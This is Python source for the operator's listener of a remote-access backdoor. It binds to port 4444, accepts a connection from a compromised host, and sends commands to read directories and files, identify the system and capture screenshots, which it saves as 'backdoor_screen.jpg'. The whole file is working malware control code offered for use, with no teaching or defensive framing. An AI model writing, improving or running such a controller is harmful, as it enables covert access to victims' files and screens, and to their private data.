import socket
import os
from colorama import Fore,Back,Style

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

host = socket.gethostname()
port = 4444

s.bind((host,port))
s.listen()
print(Fore.GREEN+"[+] Listening mode on!"+Fore.RESET)
conn,addr = s.accept()
print(Fore.CYAN+f"[+] Connected from {addr}"+Fore.RESET)

def help_func():
    print("Available command list")

    print("pwd")
    print("ls")
    print("id")
    print("cat")
    print("uname")
    print("screenshot")
    print("(Command line will be UPDATED!)")
    print("\n")
while True:
    cmd = input(str(":$  "))
    if cmd == "help":
        help_func()

    elif cmd == "pwd":
        conn.send(cmd.encode())
        data = conn.recv(5000)
        data = data.decode()
        print(data)
    
    elif cmd == "ls":
        conn.send(cmd.encode())
        path = input(str("$dir: "))
        path = path.encode()
        conn.send(path)
        
        data = conn.recv(5000)
        data = data.decode()
        print(data)
    
    elif cmd == "id":
        conn.send(cmd.encode())
        data = conn.recv(5000)
        data = data.decode()
        print(data)

    elif cmd == "uname":
        conn.send(cmd.encode())
        data = conn.recv(5000)
        data = data.decode()
        print(data)


    elif cmd == "cat":
        conn.send(cmd.encode())

        f = input(str("$file: "))
        f = f.encode()
        conn.send(f)
        
        data = conn.recv(5000)
        data = data.decode()
        print(data)
    elif cmd == "screenshot":
        conn.send(cmd.encode())
        img = open("backdoor_screen.jpg","wb")
        img_data = conn.recv(5000000)
        i = True
        while i:
            img.write(img_data)
            i = False
        
    else:
        print(Back.RED+"[-] Command Not Found!"+Back.RESET)
    
